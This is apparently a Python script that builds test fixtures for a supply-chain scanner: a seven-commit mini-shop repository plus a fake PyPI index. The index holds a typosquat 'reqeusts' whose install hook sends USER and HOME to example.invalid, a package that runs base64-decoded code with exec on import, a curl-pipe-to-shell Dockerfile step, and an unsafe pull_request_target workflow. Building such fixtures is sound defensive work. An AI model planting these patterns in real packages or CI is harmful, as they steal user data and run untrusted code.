"""Full mini-shop fixture for Stages 4-6.

Builds the team's two-commit mini-shop (``make_mini_shop.sh``, used unchanged) and adds five commits:

3. known-vulnerable pins (docs/stage4.md section 14): PyYAML 5.3.1 used through ``FullLoader`` at
   startup, joblib 1.1.0 used only through ``joblib.dump`` in a job, idna 3.7 pulled in by requests
   (``poetry.lock`` gives Stage 1 the dependency edges), pytest 8.0.0 in requirements-dev.
4. new packages (docs/stage5.md section 10): ``reqeusts`` (typosquat, sdist-only, install hook),
   ``minishop-utils`` 1.0 (wheel), ``shopfront-theme`` 2.4.0 (wheel).
5. updates: ``minishop-utils`` 1.1 (sdist-only, base64 + exec on import) and ``shopfront-theme``
   2.4.1 (same maintainer, wheels, no behaviour change: the legitimate case).
6. build environment: ``FROM python:latest``, ``curl | sh`` in the Dockerfile, a workflow on
   ``pull_request_target`` that checks out the PR head, and a third-party action pinned by tag.
7. a lockfile-only commit that changes one hash of requests 2.31.0.

It also writes ``fake-pypi/``: a PyPI-style JSON API (``pypi/<name>/json``, ``pypi/<name>/<version>/json``)
plus the distribution files, for the fake packages and requests 2.31.0 (real published digests).
Point Guardian at it with ``GUARDIAN_PYPI_URL=<target>/fake-pypi/pypi``.

Everything is harmless: the only network destination in the fake packages is ``example.invalid``
(reserved, never resolves), the decoded "payload" is a ``print``, and Guardian only parses these files;
it never installs, builds or imports them.

    python tests/fixtures/make_mini_shop_full.py <target-dir>   # -> <target>/mini-shop, <target>/fake-pypi
"""
from __future__ import annotations

import base64
import hashlib
import io
import json
import os
import shutil
import subprocess
import sys
import tarfile
import textwrap
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
BASE_SCRIPT = HERE / "make_mini_shop.sh"

# Real digests published on PyPI for requests 2.31.0 (https://pypi.org/pypi/requests/2.31.0/json).
REQUESTS_WHL_SHA = "58cd2187c01e70e6e26505bca751777aa9f2ee0b7f4300988b709f44e013003f"
REQUESTS_SDIST_SHA = "942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1"
TAMPERED_SHA = "0" * 8 + REQUESTS_WHL_SHA[8:]   # commit 7: one hash changed in poetry.lock


def find_bash() -> str:
    found = shutil.which("bash")
    if found and "system32" in found.lower():          # Windows: WSL launcher, not Git Bash
        git_bash = Path(r"C:\Program Files\Git\bin\bash.exe")
        if git_bash.exists():
            return str(git_bash)
        raise RuntimeError("Git Bash is needed to build the fixture on Windows")
    if not found:
        raise RuntimeError("bash is needed to build the fixture")
    return found


def git(repo: Path, *args: str) -> str:
    env = {**os.environ, "GIT_AUTHOR_NAME": "Guardian Tester", "GIT_COMMITTER_NAME": "Guardian Tester",
           "GIT_AUTHOR_EMAIL": "guardian-tester@example.com", "GIT_COMMITTER_EMAIL": "guardian-tester@example.com"}
    res = subprocess.run(["git", "-C", str(repo), *args], capture_output=True, text=True, env=env, encoding="utf-8")
    if res.returncode != 0:
        raise RuntimeError(f"git {' '.join(args)} failed: {res.stderr}")
    return res.stdout


def write(repo: Path, rel: str, text: str) -> None:
    p = repo / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(textwrap.dedent(text).lstrip("\n"), encoding="utf-8", newline="\n")


def commit(repo: Path, message: str) -> None:
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", message)


# --------------------------------------------------------------------------- poetry.lock

BASE_LOCK = [
    # name, version, dependencies, files [(filename, sha256)]
    ("blinker", "1.9.0", {}, []),
    ("certifi", "2026.11.20", {}, []),
    ("charset-normalizer", "3.5.3", {}, []),
    ("click", "8.5.1", {"colorama": '{version = "*", markers = "platform_system == \\"Windows\\""}'}, []),
    ("colorama", "0.4.6", {}, []),
    ("Flask", "3.0.0", {"blinker": '">=1.6.2"', "click": '">=8.1.3"', "itsdangerous": '">=2.1.2"',
                        "Jinja2": '">=3.1.2"', "Werkzeug": '">=3.0.0"'}, []),
    ("greenlet", "3.5.6", {}, []),
    ("idna", "3.7", {}, []),
    ("iniconfig", "2.3.1", {}, []),
    ("itsdangerous", "2.2.0", {}, []),
    ("Jinja2", "3.1.6", {"MarkupSafe": '">=2.0"'}, []),
    ("joblib", "1.1.0", {}, []),
    ("MarkupSafe", "3.0.4", {}, []),
    ("packaging", "26.3", {}, []),
    ("pluggy", "1.7.0", {}, []),
    ("pytest", "8.0.0", {"colorama": '{version = "*", markers = "sys_platform == \\"win32\\""}',
                         "iniconfig": '"*"', "packaging": '"*"', "pluggy": '">=1.3.0,<2.0"'}, []),
    ("PyYAML", "5.3.1", {}, []),
    ("requests", "2.31.0", {"certifi": '">=2017.4.17"', "charset-normalizer": '">=2,<4"', "idna": '">=2.5,<4"',
                            "urllib3": '">=1.21.1,<3"'},
     [("requests-2.31.0-py3-none-any.whl", REQUESTS_WHL_SHA), ("requests-2.31.0.tar.gz", REQUESTS_SDIST_SHA)]),
    ("SQLAlchemy", "2.0.20", {"greenlet": '{version = "!=0.4.17", markers = "platform_machine == \\"x86_64\\""}',
                              "typing-extensions": '">=4.2.0"'}, []),
    ("stripe", "5.4.0", {"requests": '">=2.20"'}, []),
    ("typing-extensions", "4.16.0", {}, []),
    ("urllib3", "2.8.0", {}, []),
    ("Werkzeug", "3.1.9", {"MarkupSafe": '">=2.1.1"'}, []),
]


def render_lock(packages: list[tuple]) -> str:
    out = ["# This file is automatically @generated by Poetry 1.8.3 and should not be changed by hand.", ""]
    for name, version, deps, files in sorted(packages, key=lambda p: p[0].lower()):
        out += ["[[package]]", f'name = "{name}"', f'version = "{version}"', 'description = ""', "optional = false",
                'python-versions = ">=3.8"']
        if files:
            out.append("files = [")
            out += [f'    {{file = "{fn}", hash = "sha256:{sha}"}},' for fn, sha in files]
            out.append("]")
        else:
            out.append("files = []")
        out.append("")
        if deps:
            out.append("[package.dependencies]")
            out += [f"{k} = {v}" for k, v in deps.items()]
            out.append("")
    out += ["[metadata]", 'lock-version = "2.0"', 'python-versions = "^3.11"',
            'content-hash = "9f2a6c1d0b7e4f3a8c5d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b"', ""]
    return "\n".join(out)


# --------------------------------------------------------------------------- fake packages

REQEUSTS_SETUP = '''\
import base64
import os
import urllib.request

from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    """Fixture only: example.invalid is a reserved domain that never resolves."""

    def run(self):
        install.run(self)
        info = {"user": os.environ.get("USER", ""), "home": os.environ.get("HOME", "")}
        payload = base64.b64encode(repr(info).encode()).decode()
        urllib.request.urlopen("https://example.invalid/collect?d=" + payload, timeout=1)


setup(name="reqeusts", version="2.31.0", py_modules=["reqeusts"], cmdclass={"install": PostInstall})
'''

REQEUSTS_MODULE = '''\
"""Fixture typosquat of requests (harmless)."""
from requests import *  # noqa: F401,F403
'''

UTILS_V10 = '''\
"""Small formatting helpers for mini-shop."""


def money(value):
    return f"{value:.2f}"


def slug(text):
    return "-".join(text.lower().split())
'''

# base64 of: print('minishop-utils telemetry disabled')   (harmless)
UTILS_PAYLOAD = base64.b64encode(b"print('minishop-utils telemetry disabled')").decode()
UTILS_V11 = f'''\
"""Small formatting helpers for mini-shop."""
import base64

_BOOT = "{UTILS_PAYLOAD}"
exec(base64.b64decode(_BOOT).decode())


def money(value):
    return f"{{value:.2f}}"


def slug(text):
    return "-".join(text.lower().split())
'''

UTILS_SETUP = '''\
from setuptools import setup

setup(name="minishop-utils", version="1.1", packages=["minishop_utils"])
'''

THEME_MODULE = '''\
"""Badges and colours for the mini-shop storefront."""
VERSION = "{version}"
COLOURS = {{"ok": "#2e7d32", "warn": "#f9a825", "error": "#c62828"}}


def badge(status):
    colour = COLOURS.get(status, "#616161")
    return f'<span class="badge" style="background:{{colour}}">{{status}}</span>'
'''


def _metadata(name: str, version: str, author: str, urls: dict[str, str]) -> str:
    lines = ["Metadata-Version: 2.1", f"Name: {name}", f"Version: {version}", f"Summary: {name} fixture package",
             f"Author: {author}", f"Author-email: {author.lower().replace(' ', '.')}@example.com"]
    lines += [f"Project-URL: {k}, {v}" for k, v in urls.items()]
    return "\n".join(lines) + "\n"


def build_wheel(dest: Path, name: str, version: str, files: dict[str, str], author: str, urls: dict[str, str]) -> Path:
    dist = name.replace("-", "_")
    path = dest / f"{dist}-{version}-py3-none-any.whl"
    info = f"{dist}-{version}.dist-info"
    entries = dict(files)
    entries[f"{info}/METADATA"] = _metadata(name, version, author, urls)
    entries[f"{info}/WHEEL"] = "Wheel-Version: 1.0\nGenerator: fixture\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
    record = [f"{k},sha256={base64.urlsafe_b64encode(hashlib.sha256(v.encode()).digest()).decode().rstrip('=')},{len(v.encode())}"
              for k, v in entries.items()]
    entries[f"{info}/RECORD"] = "\n".join(record + [f"{info}/RECORD,,"]) + "\n"
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for k, v in entries.items():
            zi = zipfile.ZipInfo(k, date_time=(2026, 1, 1, 0, 0, 0))
            z.writestr(zi, v)
    return path


def build_sdist(dest: Path, name: str, version: str, files: dict[str, str], author: str, urls: dict[str, str]) -> Path:
    base = f"{name.replace('-', '_')}-{version}"
    path = dest / f"{base}.tar.gz"
    entries = dict(files)
    entries["PKG-INFO"] = _metadata(name, version, author, urls)
    with tarfile.open(path, "w:gz") as tar:
        for k, v in entries.items():
            data = v.encode()
            ti = tarfile.TarInfo(f"{base}/{k}")
            ti.size, ti.mtime, ti.mode = len(data), 1767225600, 0o644
            tar.addfile(ti, io.BytesIO(data))
    return path


def build_index(target: Path, now: datetime) -> dict[str, dict[str, str]]:
    """Write fake-pypi/ and return {name: {version: sha256 of the main file}} for poetry.lock."""
    root = target / "fake-pypi"
    shutil.rmtree(root, ignore_errors=True)
    files_dir = root / "files"
    files_dir.mkdir(parents=True)
    theme_urls_old = {"Homepage": "https://github.com/shopfront/shopfront-theme"}
    theme_urls_new = {**theme_urls_old, "Changelog": "https://github.com/shopfront/shopfront-theme/releases"}
    releases = {
        # name: [(version, kind, files, author, urls, uploaded)]
        "reqeusts": [("2.31.0", "sdist", {"setup.py": REQEUSTS_SETUP, "reqeusts.py": REQEUSTS_MODULE},
                      "Kenneth Reitz", {"Homepage": "https://example.invalid/reqeusts"}, now - timedelta(days=12))],
        "minishop-utils": [
            ("1.0", "wheel", {"minishop_utils/__init__.py": UTILS_V10}, "Shop Tools", {"Homepage": "https://github.com/shop-tools/minishop-utils"}, now - timedelta(days=200)),
            ("1.1", "sdist", {"setup.py": UTILS_SETUP, "minishop_utils/__init__.py": UTILS_V11}, "Shop Tools", {"Homepage": "https://github.com/shop-tools/minishop-utils"}, now - timedelta(days=1)),
        ],
        "shopfront-theme": [
            ("2.4.0", "wheel", {"shopfront_theme/__init__.py": THEME_MODULE.format(version="2.4.0"), "shopfront_theme/theme.css": ".badge{padding:2px 6px}\n"},
             "Shopfront Team", theme_urls_old, now - timedelta(days=90)),
            ("2.4.1", "wheel", {"shopfront_theme/__init__.py": THEME_MODULE.format(version="2.4.1"), "shopfront_theme/theme.css": ".badge{padding:2px 8px;border-radius:4px}\n"},
             "Shopfront Team", theme_urls_new, now - timedelta(days=2)),
        ],
    }
    lock_hashes: dict[str, dict[str, str]] = {}
    for name, rels in releases.items():
        all_rel: dict[str, list] = {}
        latest_info = None
        for version, kind, files, author, urls, uploaded in rels:
            builder = build_wheel if kind == "wheel" else build_sdist
            path = builder(files_dir, name, version, files, author, urls)
            sha = hashlib.sha256(path.read_bytes()).hexdigest()
            lock_hashes.setdefault(name, {})[version] = f"{path.name}|{sha}"
            entry = {"filename": path.name, "packagetype": "bdist_wheel" if kind == "wheel" else "sdist",
                     "digests": {"sha256": sha}, "upload_time_iso_8601": uploaded.strftime("%Y-%m-%dT%H:%M:%S.000000Z"),
                     "size": path.stat().st_size, "yanked": False, "url": f"files/{path.name}"}
            info = {"name": name, "version": version, "author": author,
                    "author_email": f"{author.lower().replace(' ', '.')}@example.com", "maintainer": "",
                    "project_urls": urls, "requires_dist": None, "summary": f"{name} fixture package",
                    "home_page": urls.get("Homepage", "")}
            all_rel[version] = [entry]
            vdir = root / "pypi" / name / version
            vdir.mkdir(parents=True, exist_ok=True)
            (vdir / "json").write_text(json.dumps({"info": info, "urls": [entry]}, indent=1), encoding="utf-8")
            latest_info = (info, [entry])
        (root / "pypi" / name / "json").write_text(json.dumps(
            {"info": latest_info[0], "urls": latest_info[1], "releases": all_rel}, indent=1), encoding="utf-8")

    # requests 2.31.0: real published metadata and digests (no files: never downloaded)
    req = {"name": "requests", "version": "2.31.0", "author": "Kenneth Reitz", "author_email": "me@kennethreitz.org",
           "maintainer": "", "project_urls": {"Source": "https://github.com/psf/requests"}, "summary": "Python HTTP for Humans.",
           "requires_dist": ["charset-normalizer (<4,>=2)", "idna (<4,>=2.5)", "urllib3 (<3,>=1.21.1)", "certifi (>=2017.4.17)"]}
    urls = [{"filename": "requests-2.31.0-py3-none-any.whl", "packagetype": "bdist_wheel", "digests": {"sha256": REQUESTS_WHL_SHA},
             "upload_time_iso_8601": "2023-05-22T15:12:42.313790Z", "size": 62574, "yanked": False},
            {"filename": "requests-2.31.0.tar.gz", "packagetype": "sdist", "digests": {"sha256": REQUESTS_SDIST_SHA},
             "upload_time_iso_8601": "2023-05-22T15:12:44.175995Z", "size": 110794, "yanked": False}]
    vdir = root / "pypi" / "requests" / "2.31.0"
    vdir.mkdir(parents=True)
    (vdir / "json").write_text(json.dumps({"info": req, "urls": urls}, indent=1), encoding="utf-8")
    return lock_hashes


def lock_entry(name: str, version: str, hashes: dict) -> tuple:
    fn, sha = hashes[name][version].split("|")
    return (name, version, {}, [(fn, sha)])


# --------------------------------------------------------------------------- commits

def build(target: Path) -> Path:
    target.mkdir(parents=True, exist_ok=True)
    repo = target / "mini-shop"
    res = subprocess.run([find_bash(), str(BASE_SCRIPT), "mini-shop"], cwd=target, capture_output=True, text=True)
    if res.returncode != 0:
        raise RuntimeError(f"make_mini_shop.sh failed: {res.stderr[-500:]}")
    now = datetime.now(timezone.utc)
    hashes = build_index(target, now)

    # --- commit 3: known-vulnerable pins (stage 4) ---
    write(repo, "requirements.txt", """
        Flask==3.0.0
        stripe==5.4.0
        SQLAlchemy==2.0.20
        PyYAML==5.3.1
        requests==2.31.0
        colorama==0.4.6
        joblib==1.1.0
        """)
    write(repo, "app/config/load.py", """
        import yaml

        def load_settings(path="settings.yaml"):
            with open(path, "r") as f:
                return yaml.load(f, Loader=yaml.FullLoader)
        """)
    write(repo, "app/__init__.py", """
        # Mini shop app package
        from app.config.load import load_settings

        SETTINGS = load_settings()
        """)
    write(repo, "app/jobs/__init__.py", "")
    write(repo, "app/jobs/export.py", """
        import joblib

        from app.models import Order


        def export_orders(path="orders.cache"):
            orders = [Order(1, 100), Order(2, 250)]
            joblib.dump(orders, path)
            return path


        if __name__ == "__main__":
            export_orders()
        """)
    lock = list(BASE_LOCK)
    (repo / "poetry.lock").write_text(render_lock(lock), encoding="utf-8", newline="\n")
    commit(repo, "Pin legacy config loader and add nightly order export")

    # --- commit 4: new packages (stage 5) ---
    write(repo, "requirements.txt", """
        Flask==3.0.0
        stripe==5.4.0
        SQLAlchemy==2.0.20
        PyYAML==5.3.1
        requests==2.31.0
        colorama==0.4.6
        joblib==1.1.0
        reqeusts==2.31.0
        minishop-utils==1.0
        shopfront-theme==2.4.0
        """)
    write(repo, "app/web/__init__.py", "")
    write(repo, "app/web/status.py", """
        from shopfront_theme import badge


        def render_status(ok):
            return badge("ok" if ok else "error")
        """)
    write(repo, "app/api/routes.py", """
        from flask import Flask, request, jsonify
        from app.payments.service import charge
        from app.utils.helpers import send_event
        from app.web.status import render_status

        app = Flask(__name__)

        @app.post("/checkout")
        def checkout():
            data = request.json or {}
            result = charge(data.get("amount", 0))
            send_event("checkout_completed", result)
            return jsonify({"status": "success", "charge": result})

        @app.get("/status")
        def status():
            return render_status(request.args.get("ok", "1") == "1")
        """)
    write(repo, "app/jobs/export.py", """
        import joblib
        from minishop_utils import money

        from app.models import Order


        def export_orders(path="orders.cache"):
            orders = [Order(1, 100), Order(2, 250)]
            joblib.dump(orders, path)
            print("exported", money(sum(o.amount for o in orders)))
            return path


        if __name__ == "__main__":
            export_orders()
        """)
    lock += [lock_entry("reqeusts", "2.31.0", hashes), lock_entry("minishop-utils", "1.0", hashes),
             lock_entry("shopfront-theme", "2.4.0", hashes)]
    (repo / "poetry.lock").write_text(render_lock(lock), encoding="utf-8", newline="\n")
    commit(repo, "Add storefront status badge and export formatting")

    # --- commit 5: updates (one suspicious, one routine) ---
    text = (repo / "requirements.txt").read_text(encoding="utf-8")
    text = text.replace("minishop-utils==1.0", "minishop-utils==1.1").replace("shopfront-theme==2.4.0", "shopfront-theme==2.4.1")
    (repo / "requirements.txt").write_text(text, encoding="utf-8", newline="\n")
    lock = [p for p in lock if p[0] not in ("minishop-utils", "shopfront-theme")]
    lock += [lock_entry("minishop-utils", "1.1", hashes), lock_entry("shopfront-theme", "2.4.1", hashes)]
    (repo / "poetry.lock").write_text(render_lock(lock), encoding="utf-8", newline="\n")
    commit(repo, "Bump minishop-utils and shopfront-theme")

    # --- commit 6: build environment ---
    write(repo, "Dockerfile", """
        FROM python:latest
        WORKDIR /app
        RUN curl -fsSL https://example.invalid/install.sh | sh
        COPY requirements.txt .
        RUN pip install -r requirements.txt
        COPY . .
        CMD ["flask", "run"]
        """)
    write(repo, ".github/workflows/ci.yml", """
        name: CI
        on:
          push:
            branches: [main]
          pull_request_target:

        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{ github.event.pull_request.head.sha }}
              - uses: shopfront/setup-cache@v1
              - name: Run tests
                run: pytest
                env:
                  TEST_TOKEN: ${{ secrets.SUPER_SECRET_KEY }}
        """)
    commit(repo, "Use the latest Python image and run CI for forks")

    # --- commit 7: lockfile-only change with an altered hash ---
    lock_text = (repo / "poetry.lock").read_text(encoding="utf-8").replace(REQUESTS_WHL_SHA, TAMPERED_SHA)
    (repo / "poetry.lock").write_text(lock_text, encoding="utf-8", newline="\n")
    commit(repo, "Refresh lockfile")
    return repo


if __name__ == "__main__":
    dest = Path(sys.argv[1] if len(sys.argv) > 1 else "mini-shop-full").resolve()
    repo = build(dest)
    print(f"mini-shop (7 commits) at {repo}; fake index at {dest / 'fake-pypi'}")
